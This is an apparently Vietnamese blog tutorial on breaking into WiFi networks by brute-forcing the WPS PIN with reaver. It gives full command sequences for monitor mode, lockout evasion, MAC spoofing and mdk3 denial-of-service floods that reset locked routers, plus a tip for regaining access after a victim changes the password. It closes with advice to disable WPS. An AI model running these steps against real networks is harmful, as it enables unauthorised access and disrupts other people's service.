# Nghịch vài trò "hack" Wifi - Phần 2: WPS

Ở phần thứ nhất, chúng ta đã tìm hiểu cách hack wifi bằng phương pháp từ điển - lợi dụng sơ hở trong quá trình xác thực bắt tay 4 bước. Hack wifi bằng từ điển có ưu điểm là hạ được nhiều loại bảo mật nhưng lại gặp vấn đề khi người dùng đặt mật khẩu khó, có khi chạy cả tháng, cả năm cũng không ra mật khẩu. Thay vào đó, chúng ta sẽ lợi dụng sơ hở trong xác thực mã pin, hôm nay mình sẽ trình bày phương pháp hack wifi thông qua WPS.
## Tổng quan
Với phương pháp hack wifi bằng WPS, điều kiện tiên quyết là modem wifi phải bật chế độ WPS, vậy WPS là gì?
WPS - WiFi Protected Setup, là tính năng hỗ trợ kết nối mạng wifi giữa Client và AP với nhau, nhưng lại bỏ qua bước phải nhập mật khẩu WiFi truyền thống. Nhờ có WPS mà người dùng không cần nhớ mật khẩu vẫn có thể truy cập vào AP, hầu hết modem hiện nay đều hỗ trợ WPS (có thể xem ở modem nhà bạn). Và quan trọng hơn là nó mặc định được bật :).
## Công cụ và thực hành
- <a href="https://www.aircrack-ng.org/doku.php">Aircrack-ng</a>: công cụ chuyển chế độ monitor
- <a href="https://github.com/t6x/reaver-wps-fork-t6x">Reaver</a>: công cụ mạnh mẽ tấn công kiểm tra các mạng wifi sử dụng phương thức tấn công brute force mã PIN
- <a href="https://gitlab.com/kalilinux/packages/mdk3">Mdk3</a>: công cụ tấn công gói tin tới AP
- <a href="https://github.com/alobbs/macchanger">Macchanger</a>: công cụ hỗ trợ thay đổi địa chỉ mac của thiết bị

Như cách tấn công bằng từ điển, chúng ta cần có 1 card wifi hỗ trợ monitor, ở đây mình vẫn chọn TP-link WN722N V1.
<img src="https://crowi.pionero.io/files/610edcc41120630068a6a65e"  width="400px" height="300px">
Kiểm tra tên của card wifi:

```shell
# airmon-ng
```
<img src="https://crowi.pionero.io/files/610edd4c1120630068a6a660" height="150px">

Tắt toàn bộ tiến trình sử dụng mạng
```shell
# airmon-ng check kill
```
<img src="https://crowi.pionero.io/files/610edd4c1120630068a6a65f" height="150px">

Start monitor cho card có tên là wlan0
```shell
# airmon-ng start wlan0
```
<img src="https://crowi.pionero.io/files/610ee1381120630068a6a66c" height="150px">

Kiểm tra lại lần nữa:
```shell
# airmon-ng
```
<img src="https://crowi.pionero.io/files/610edd4c1120630068a6a663" height="150px">

Chúng ta có 1 monitor là wlan0mon, bây giờ ta thực hiện các thao tác trên monitor.
Quét tất cả các AP hỗ trợ WPS xung quanh:
```shell
# wash -i wlan0mon
```
![Screenshot_2021-08-29_10-01-20.png](https://crowi.pionero.io/files/612b933d01bb4b0067d0ad93)
Nếu lệnh này không hiển thị được các AP, fix bằng cách tạo 1 thư mục `reaver` cho nó.
```shell
# mdkir /etc/reaver
```
Xác định mục tiêu, như thường lệ, mình vẫn chọn AP có tên là **Room_402**, chính là AP của phòng mình(đã đổi mật khẩu khác trước nhé ^_^)
Chúng ta cần xác định 1 số tham số:
- Bssid: Địa chỉ MAC của AP
- Channel: Kênh của AP
- Essid: Tên của AP

Sau khi xác định được các yếu tố trên, chạy lệnh:
```shell
# reaver -i wlan0mon -b <bssid> -vv -S -g 21 -A -L -N
```
Trong đó:
- vv: Xem log 1 cách chi tiết
- g: số lần attempts mã pin, ở đây mình chọn là 21 - kinh nghiệm
- A: Không sử dụng *associate*, ở đây mình *associate* bằng *aireplay-ng* để tránh timeout
- L: không cập nhât trạng thái locked
- N: không sử dụng Nack message


Sử dụng aireplay-ng để gửi liên tục các fake-auth để tránh tình trạng AP bị timeout.
```shell
# iw dev wlan0mon set channel <channel> && aireplay-ng --fakeauth 15 -a <bssid > -e <essid> wlan0mon
```

Trong quá trình tấn công, có 1 vài modem chặn quá trình tấn công **DDOS** nên chúng ta phải liên tục thay đổi địa chỉ MAC cho monitor.
```shell
# ifconfig wlan0mon down
# macchanger -r wlan0mon
# ifconfig wlan0mon up
```
Tham số -r để chỉ định sinh ra ngẫu nhiên.
![image.png](https://crowi.pionero.io/files/612b953b01bb4b0067d0ad94)


Một số modem có cơ chế tự động tắt WPS nếu nhận quá nhiều attempts, nếu kiểm tra thấy WPS đã bị lock, chúng ta cần tấn công **DDOS** để modem reset và bât lại WPS. Ở đây, ta sử dụng Mdk3 để tấn công.
Chúng ta có thể sử dụng các mode a b d m để tấn công, hoặc kết hợp toàn bộ, chi tiết xem thêm ở <a href="https://kalitut.com/mdk3-examples-tutorial/">đây</a>.
## Kết quả
Sau tầm 15p chúng ta đã có kết quả, mặc dù password đã đặt rất khó: *@&wifi#nay#deo#the#hack#1998$$*
nhưng sử dụng WPS vẫn chỉ mất có 15p ^_^.
![image.png](https://crowi.pionero.io/files/612b923b01bb4b0067d0ad92)

1 tip nữa sau khi có được mã pin, dù victim có thay đổi mật khẩu thì chúng ta vẫn dễ dàng tìm được, chỉ cần thêm tham số -p ở câu lệnh:
```shell
# reaver -i wlan0mon -b <bssid> -vv -S -g 21 -A -L -N -p <pin>
```
Với pin là pin đã lấy được ở trên.
## Tổng kết
Kĩ thuật lợi dụng WPS là 1 kĩ thuật khó, đòi hỏi phải có nhiều kinh nghiệm cũng như xử lý tốt tình huống.
So với kĩ thuật hack bằng từ điển thì kĩ thuật này có ưu điểm không cần biết mật khẩu đặt khó hay không, nhưng nhược điểm là bắt buộc modem phải bật WPS. Do đó, điều chúng ta rút ra rằng là không nên bật chế độ WPS nếu không thực sự quá cần thiết.
Sang bài tiếp theo, chúng ta sẽ tiếp cận với một hướng đi khác, dễ hơn, lợi hại hơn nhưng cũng nguy hiểm - **Phising Attack**.

*lưu ý: bài viết chỉ nhằm mục đích học tập, mình không chịu trách nhiệm cho mọi tình huống*